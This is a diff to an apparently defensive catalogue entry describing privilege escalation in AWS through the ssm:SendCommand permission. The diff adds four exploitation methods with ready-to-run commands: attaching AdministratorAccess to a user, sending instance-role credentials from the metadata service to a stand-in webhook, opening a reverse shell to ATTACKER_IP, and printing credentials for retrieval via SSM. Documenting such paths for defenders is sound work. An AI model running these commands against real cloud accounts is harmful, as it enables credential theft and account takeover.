@@ -4,11 +4,7 @@ category: access-resource
 services:
 - ssm
 - ec2
-description: The `ssm:SendCommand` permission allows a principal to execute commands on any EC2 instance on which they have
-  this permission, using SSM Run Command. This access is contingent on the EC2 instance having the SSM agent installed, possessing
-  the AmazonSSMManagedInstanceCore policy (or equivalent permissions), and being in a running state. If an instance has a
-  privileged IAM role attached, an attacker can abuse this permission to execute code that steals the credentials for that
-  role, thereby escalating their own permissions.
+description: The `ssm:SendCommand` permission allows a principal to execute commands on any EC2 instance on which they have this permission, using SSM Run Command. This access is contingent on the EC2 instance having the SSM agent installed, possessing the AmazonSSMManagedInstanceCore policy (or equivalent permissions), and being in a running state. If an instance has a privileged IAM role attached, an attacker can abuse this permission to execute code that steals the credentials for that role, thereby escalating their own permissions.
 prerequisites:
   admin:
   - EC2 instance must exist and be running
@@ -31,13 +27,17 @@ exploitationSteps:
     command: aws ssm get-command-invocation --command-id @command-id --instance-id i-XXXXXXXXXXX
     description: Retrieve the command output containing the temporary credentials
 recommendation: |
-  Restrict access to `ssm:SendCommand` using the principle of least privilege. Use the
-  Resource and Condition elements in IAM policies to limit which instances a principal
-  can run commands on and which documents they can use. Monitor use of this sensitive
-  permission using CloudSIEM detections.
+  Restrict access to `ssm:SendCommand` using the principle of least privilege. Use the Resource and Condition elements in IAM policies to limit which instances a principal can run commands on and which documents they can use. Monitor use of this sensitive permission using CloudSIEM detections.
 discoveredBy:
-  name: Unknown
-  organization: Unknown
+  name: Erik Steringer
+  organization: NCC Group
+  date: '2019'
+discoveryAttribution:
+  firstDocumented:
+    author: Erik Steringer
+    organization: NCC Group
+    date: 2019
+    link: https://github.com/nccgroup/PMapper/blob/master/principalmapper/graphing/ssm_edges.py
 references:
 - title: IAM Vulnerable - SSM SendCommand
   url: https://github.com/BishopFox/iam-vulnerable/blob/main/modules/free-resources/privesc-paths/privesc-ssmSendCommand.tf
@@ -64,6 +64,15 @@ permissions:
   required:
   - permission: ssm:SendCommand
     resourceConstraints: Target EC2 instance must be in the Resource section
+  additional:
+  - permission: ec2:DescribeInstances
+    resourceConstraints: Helpful for discovering available EC2 instances to target
+  - permission: ssm:DescribeInstanceInformation
+    resourceConstraints: Helpful for identifying instances with SSM agent installed and their online status
+  - permission: ssm:ListCommandInvocations
+    resourceConstraints: Helpful for finding command invocation IDs to retrieve output
+  - permission: ssm:GetCommandInvocation
+    resourceConstraints: Required to retrieve the command output containing the exfiltrated credentials
 attackVisualization:
   nodes:
   - id: start
@@ -80,13 +89,97 @@ attackVisualization:
     label: Existing Service Role
     type: principal
     description: |
-      The IAM role attached to the EC2 instance via instance profile. This role's temporary credentials are available through the Instance Metadata Service (IMDS) at http://169.254.169.254/latest/meta-data/iam/security-credentials/. The attacker can execute a command via SSM to retrieve these credentials and the output is captured by SSM for later retrieval.
-  - id: exfiltrate_creds
-    label: Exfiltrate credentials via IMDS
-    type: action
+      The IAM role attached to the EC2 instance via instance profile. This role's temporary credentials are available through the Instance Metadata Service (IMDS) at http://169.254.169.254/latest/meta-data/iam/security-credentials/. The attacker can execute a command via SSM to access these credentials using one of several exploitation methods.
+  - id: method_direct_elevation
+    label: "Method 1: Direct Elevation via AWS CLI"
+    type: payload
     color: '#99ccff'
     description: |
-      Using SSM SendCommand, the attacker executes a shell command on the EC2 instance to query the Instance Metadata Service (IMDS) for the instance role's temporary credentials. The command output containing the credentials (AccessKeyId, SecretAccessKey, and SessionToken) is captured by SSM and can be retrieved using get-command-invocation. These credentials can then be used from any location.
+      Use ssm:SendCommand to execute AWS CLI commands on the instance that directly elevate the starting principal's permissions. The command runs with the instance role's credentials and can perform privileged IAM actions such as:
+      - Attaching AdministratorAccess policy to the starting principal (iam:AttachUserPolicy)
+      - Creating new access keys for privileged users (iam:CreateAccessKey)
+      - Adding the starting principal to an admin IAM group (iam:AddUserToGroup)
+      - Modifying inline policies to grant elevated permissions (iam:PutUserPolicy)
+
+      Example SSM command that directly elevates starting principal:
+      ```bash
+      aws ssm send-command \
+        --instance-ids "i-XXXXXXXXXXX" \
+        --document-name "AWS-RunShellScript" \
+        --parameters commands=["aws iam attach-user-policy --user-name starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"]
+      ```
+
+      This approach is the most direct - the command immediately grants the starting principal elevated permissions using the instance role's credentials. No credential exfiltration is needed.
+  - id: method_credential_exfil
+    label: "Method 2: Exfiltrate Credentials to Remote Host"
+    type: payload
+    color: '#99ccff'
+    description: |
+      Use ssm:SendCommand to execute a command that queries IMDS for the instance role's credentials and exfiltrates them to an attacker-controlled webhook or remote listener. This is a fire-and-forget approach that automatically retrieves and sends credentials without requiring the attacker to poll SSM for command output.
+
+      Example SSM command that exfiltrates credentials:
+      ```bash
+      aws ssm send-command \
+        --instance-ids "i-XXXXXXXXXXX" \
+        --document-name "AWS-RunShellScript" \
+        --parameters commands=["ROLE_NAME=\$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/); CREDS=\$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/\$ROLE_NAME); curl -X POST -d \"\$CREDS\" https://attacker-webhook.com/collect"]
+      ```
+
+      The command automatically:
+      1. Queries the metadata service to discover the attached role name
+      2. Retrieves the full credential set (AccessKeyId, SecretAccessKey, SessionToken)
+      3. Sends the credentials to an attacker-controlled endpoint (webhook, HTTP server, etc.)
+
+      The attacker receives the credentials remotely and can then configure them locally to authenticate as the instance role. This approach doesn't require ssm:GetCommandInvocation permission.
+  - id: method_reverse_shell
+    label: "Method 3: Reverse Shell Connection"
+    type: payload
+    color: '#99ccff'
+    description: |
+      Use ssm:SendCommand to establish a reverse shell connection back to an attacker-controlled listener. The reverse shell provides interactive access to the EC2 instance, allowing the attacker to manually retrieve the instance role's temporary credentials from IMDS.
+
+      Example SSM command that establishes reverse shell:
+      ```bash
+      aws ssm send-command \
+        --instance-ids "i-XXXXXXXXXXX" \
+        --document-name "AWS-RunShellScript" \
+        --parameters commands=["bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"]
+      ```
+
+      Once the reverse shell is established, the attacker can:
+      1. Query the instance metadata service: `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME`
+      2. Extract temporary credentials (AccessKeyId, SecretAccessKey, SessionToken)
+      3. Configure these credentials locally: `aws configure set` or environment variables
+      4. Use the credentials to perform actions as the instance role
+
+      The reverse shell approach requires the attacker to maintain a listener (e.g., `nc -lvnp 4444`) but provides interactive access and flexibility for manual reconnaissance and exploitation.
+  - id: method_ssm_retrieval
+    label: "Method 4: Print Credentials and Retrieve via SSM"
+    type: payload
+    color: '#99ccff'
+    description: |
+      Use ssm:SendCommand to execute a command that queries IMDS and prints the credentials to stdout. The command output is captured by SSM and can be retrieved later using ssm:ListCommandInvocations and ssm:GetCommandInvocation. This is the most straightforward approach when you have the additional SSM permissions.
+
+      Example SSM command that prints credentials:
+      ```bash
+      aws ssm send-command \
+        --instance-ids "i-XXXXXXXXXXX" \
+        --document-name "AWS-RunShellScript" \
+        --parameters commands=["curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"]
+      ```
+
+      Then retrieve the command output:
+      ```bash
+      # List command invocations to find the CommandId
+      aws ssm list-command-invocations --instance-id i-XXXXXXXXXXX
+
+      # Get the specific command output containing credentials
+      aws ssm get-command-invocation --command-id <COMMAND_ID> --instance-id i-XXXXXXXXXXX
+      ```
+
+      The output contains the JSON response from IMDS with the instance role's temporary security credentials including AccessKeyId, SecretAccessKey, and SessionToken. The credentials can then be exported to environment variables and used with AWS CLI or SDK from any location.
+
+      This approach requires ssm:ListCommandInvocations and ssm:GetCommandInvocation permissions but is the cleanest method as all communication happens through AWS APIs without requiring external infrastructure.
   - id: admin_outcome
     label: Effective Administrator
     type: outcome
@@ -109,55 +202,121 @@ attackVisualization:
     to: ec2_instance
     label: ssm:SendCommand
     description: |
-      Use ssm:SendCommand to execute a shell command on the target EC2 instance that retrieves the IAM role credentials from the Instance Metadata Service (IMDS). The command uses the AWS-RunShellScript document to execute arbitrary commands, and SSM captures the output for later retrieval.
+      Use ssm:SendCommand to execute a command on the target EC2 instance. The command uses the AWS-RunShellScript document to execute arbitrary shell commands. Choose one of the four exploitation methods based on available permissions and operational security requirements.
 
-      Command:
+      Basic command structure:
       ```bash
       aws ssm send-command \
         --instance-ids "i-XXXXXXXXXXX" \
         --document-name "AWS-RunShellScript" \
-        --comment "Stealing IAM credentials" \
-        --parameters commands=["curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLENAME"]
+        --parameters commands=["<EXPLOITATION_COMMAND>"]
       ```
-
-      The command returns a CommandId that is used to retrieve the output in the next step.
   - from: ec2_instance
     to: instance_role
     label: Command executes on instance
     description: |
-      The SSM agent on the EC2 instance receives and executes the command. Since the command runs in the context of the instance, it has automatic access to the Instance Metadata Service (IMDS) where the instance role's temporary credentials are available. The command output is captured by SSM.
+      The SSM agent on the EC2 instance receives and executes the command. Since the command runs in the context of the instance, it has automatic access to the Instance Metadata Service (IMDS) where the instance role's temporary credentials are available. The attacker can choose one of several exploitation methods to leverage these credentials.
   - from: instance_role
-    to: exfiltrate_creds
-    label: Retrieve command output with credentials
+    to: method_direct_elevation
+    label: Option A
     description: |
-      Use ssm:GetCommandInvocation to retrieve the output of the previously executed command. The output contains the JSON response from IMDS with the instance role's temporary security credentials including AccessKeyId, SecretAccessKey, and SessionToken.
-
-      Command:
-      ```bash
-      aws ssm get-command-invocation \
-        --command-id @command-id \
-        --instance-id i-XXXXXXXXXXX
-      ```
-
-      The credentials can then be exported to environment variables and used with AWS CLI or SDK from any location.
-  - from: exfiltrate_creds
+      Execute AWS CLI commands on the instance that directly modify IAM to elevate the starting principal's permissions. This is the most direct approach and doesn't require credential exfiltration.
+  - from: instance_role
+    to: method_credential_exfil
+    label: Option B
+    description: |
+      Execute a command that exfiltrates the instance role's credentials to an attacker-controlled remote host (webhook, HTTP server, etc.). This approach doesn't require ssm:GetCommandInvocation permission.
+  - from: instance_role
+    to: method_reverse_shell
+    label: Option C
+    description: |
+      Establish a reverse shell connection back to an attacker-controlled listener for interactive access to the instance and manual credential retrieval.
+  - from: instance_role
+    to: method_ssm_retrieval
+    label: Option D
+    description: |
+      Print credentials to stdout and retrieve them later using ssm:ListCommandInvocations and ssm:GetCommandInvocation. This is the cleanest approach when you have the additional SSM permissions.
+  - from: method_direct_elevation
     to: admin_outcome
     label: If instance role has admin permissions
-    branch: A
+    branch: A1
     condition: admin
     description: |
-      If the instance role has AdministratorAccess or equivalent administrative permissions, the attacker can use the exfiltrated credentials to gain full control over the AWS account. They can create new admin users, access all resources, modify security configurations, delete resources, and perform any privileged action. This represents complete account compromise.
-  - from: exfiltrate_creds
+      If the instance role has AdministratorAccess or equivalent administrative permissions, the direct elevation approach immediately grants the starting principal full administrative access by attaching admin policies or creating admin access keys.
+  - from: method_direct_elevation
     to: partial_outcome
     label: If instance role has some permissions
-    branch: B
+    branch: A2
     condition: some_permissions
     description: |
-      If the instance role has elevated but non-administrative permissions, the attacker gains partial privilege escalation. Common scenarios include access to S3 buckets with sensitive data, RDS database credentials via Secrets Manager, DynamoDB tables, or permissions to modify specific resources. The attacker should enumerate the role's permissions and identify data access opportunities or additional privilege escalation paths.
-  - from: exfiltrate_creds
+      If the instance role has elevated but non-administrative permissions, the direct elevation approach can still grant the starting principal useful additional permissions by modifying IAM policies or group memberships within the instance role's permission scope.
+  - from: method_direct_elevation
     to: minimal_outcome
     label: If instance role has minimal permissions
-    branch: C
+    branch: A3
     condition: no_permissions
     description: |
-      If the instance role only has minimal permissions such as AmazonSSMManagedInstanceCore (required for SSM functionality), CloudWatch logs write access, or basic EC2 describe permissions, the exfiltrated credentials may not provide significant additional access beyond what the starting principal already had. However, even limited permissions could reveal information about the environment useful for reconnaissance or be combined with other techniques in a multi-step attack.
+      If the instance role only has minimal permissions (like AmazonSSMManagedInstanceCore), the direct elevation approach will fail because the role lacks the necessary IAM modification permissions. The attacker would need to choose a different exploitation method.
+  - from: method_credential_exfil
+    to: admin_outcome
+    label: If instance role has admin permissions
+    branch: B1
+    condition: admin
+    description: |
+      If the instance role has AdministratorAccess or equivalent administrative permissions, the exfiltrated credentials provide the attacker with full administrative access to the AWS account from any location. They can create new admin users, access all resources, and modify security configurations.
+  - from: method_credential_exfil
+    to: partial_outcome
+    label: If instance role has some permissions
+    branch: B2
+    condition: some_permissions
+    description: |
+      If the instance role has elevated but non-administrative permissions, the exfiltrated credentials provide partial privilege escalation including access to S3 buckets, RDS databases, DynamoDB tables, or permissions to modify specific resources.
+  - from: method_credential_exfil
+    to: minimal_outcome
+    label: If instance role has minimal permissions
+    branch: B3
+    condition: no_permissions
+    description: |
+      If the instance role only has minimal permissions such as AmazonSSMManagedInstanceCore or CloudWatch logs write access, the exfiltrated credentials may not provide significant additional access beyond what the starting principal already had.
+  - from: method_reverse_shell
+    to: admin_outcome
+    label: If instance role has admin permissions
+    branch: C1
+    condition: admin
+    description: |
+      If the instance role has AdministratorAccess or equivalent administrative permissions, the reverse shell provides interactive access to retrieve the credentials which can then be used for full administrative access to the AWS account.
+  - from: method_reverse_shell
+    to: partial_outcome
+    label: If instance role has some permissions
+    branch: C2
+    condition: some_permissions
+    description: |
+      If the instance role has elevated but non-administrative permissions, the reverse shell provides interactive access to retrieve credentials for partial privilege escalation and manual reconnaissance of available permissions.
+  - from: method_reverse_shell
+    to: minimal_outcome
+    label: If instance role has minimal permissions
+    branch: C3
+    condition: no_permissions
+    description: |
+      If the instance role only has minimal permissions, the reverse shell still provides interactive access to the instance which could be useful for reconnaissance, but the retrieved credentials may not provide significant additional access.
+  - from: method_ssm_retrieval
+    to: admin_outcome
+    label: If instance role has admin permissions
+    branch: D1
+    condition: admin
+    description: |
+      If the instance role has AdministratorAccess or equivalent administrative permissions, retrieving the credentials via SSM GetCommandInvocation provides the attacker with full administrative access to the AWS account. This is the cleanest approach as all communication happens through AWS APIs.
+  - from: method_ssm_retrieval
+    to: partial_outcome
+    label: If instance role has some permissions
+    branch: D2
+    condition: some_permissions
+    description: |
+      If the instance role has elevated but non-administrative permissions, the SSM retrieval approach provides partial privilege escalation with credentials that can be cleanly retrieved through AWS APIs without requiring external infrastructure.
+  - from: method_ssm_retrieval
+    to: minimal_outcome
+    label: If instance role has minimal permissions
+    branch: D3
+    condition: no_permissions
+    description: |
+      If the instance role only has minimal permissions such as AmazonSSMManagedInstanceCore, the credentials retrieved via SSM may not provide significant additional access, but the clean API-based approach maintains operational security by avoiding external infrastructure.
